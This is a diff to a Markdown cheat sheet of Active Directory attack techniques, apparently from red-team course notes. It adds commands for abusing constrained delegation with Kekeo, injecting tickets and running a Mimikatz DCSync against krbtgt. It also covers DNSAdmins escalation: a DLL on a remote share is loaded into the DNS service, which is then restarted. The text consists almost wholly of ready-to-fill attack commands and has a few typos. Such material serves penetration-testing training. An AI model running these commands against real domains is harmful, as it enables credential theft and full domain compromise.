@@ -365,7 +365,7 @@
 > > > > ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
 > > > > ```
 > >
-> > :two: :one: ***Constrained Delegation*** 
+> > :two: :two: ***Constrained Delegation*** 
 > >
 > > > :information_desk_person: Request only to specified services on specified computers;
 > > >
@@ -429,16 +429,67 @@
 > > > > > ```powershell
 > > > > > KEKO# tgt::ask /user:<machineNAme>$ /domain:<DomainFQDN> /rc4:<MachineNTLMHash>
 > > > > > 
-> > > > > KEKO# tgs::s4u /tgt:<TGTFilePAth> /user:<Administrator@<DomainFQDN> /service:<serviceNAme/DomainFQDN> | <serviceNAme/DomainFQDN> 
-> > > > > ```
-> > > > >
+> > > > > KEKO# tgs::s4u /tgt:<TGTFilePAth> /user:<Administrator@<DomainFQDN> /service:<serviceNAme/DomainFQDN> | <serviceNAme{ldap}/DomainFQDN> 
 > > > > > 
+> > > > > Invoke-Mimikatz -Command '"kerberos::ptt <TGTFilePAth>"'
+> > > > > 
+> > > > > Klist
+> > > > > 
+> > > > > Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domainNAme>/krbtgt"'
+> > > > > ```
+> >
+> > :two::three: DNSAdmin
+> >
+> > > :bulb: DNSAdmin Group memeber could load arbitrary DLL with the privileges of dns.exe (SYSTEM) 
+> > >
+> > > :information_desk_person: Needs privileges to restart DNS service 
+> > >
+> > > **Enumerate members of DNS Group**
+> > >
+> > > > **PowerView_dev** 
 > > > >
-> > > > 
+> > > > > ```powershell
+> > > > > Get-NetGroupMemeber -GroupName "DNSAdmins"
+> > > > > ```
+> > > >
+> > > > **AD Module**
+> > > >
+> > > > > ```powershell
+> > > > > Get-ADGroupMember -Identity DNSAdmins
+> > > > > ```
+> > >
+> > > ***Compromise a member account***
+> > >
+> > > ***Exploit*** -- Using privileged DNSAdmin group member 
+> > >
+> > > > **Configure DLL using dnscmd.exe** ***(needs RSAT DNS)***
+> > > >
+> > > > > ```powershell
+> > > > > dnscmd <DNSServerComputerNAme> /config /serverlevelplugindll \\<IP>\dll\mimilib.dll
+> > > > > ```
+> > >
+> > > > ***Configure DLL using DNSServer (needs RSAT DNS)***
+> > > >
+> > > > > ```powershell
+> > > > > $dnsettings = Get-DnsServerSettings -ComputerName <DNSServerNAme> -Verbose -All
+> > > > > 
+> > > > > $dnsettings.ServerLevelPluginDll = "\\<IP>\dll\mimilib.dll"
+> > > > > 
+> > > > > Set-DnsSetting -InputObject $dnsettings -ComputerName <DNSServerComputerName> -Verbose 
+> > > > > ```
 > >
-> > > 
-> >
-> > 
+> > > > **Restart Service**
+> > > >
+> > > > > ```powershell
+> > > > > smd 
+> > > > > sc \\DNS-Server-NAme stop dns 
+> > > > > sc \\DNS-Server-NAme start dns 
+> > > > > 
+> > > > > ```
+
+***Privs Escalation*** -- Across Trust 
+
+> 
 
 ***Persistence*** <u>Mimikatz at rescue:</u>
 
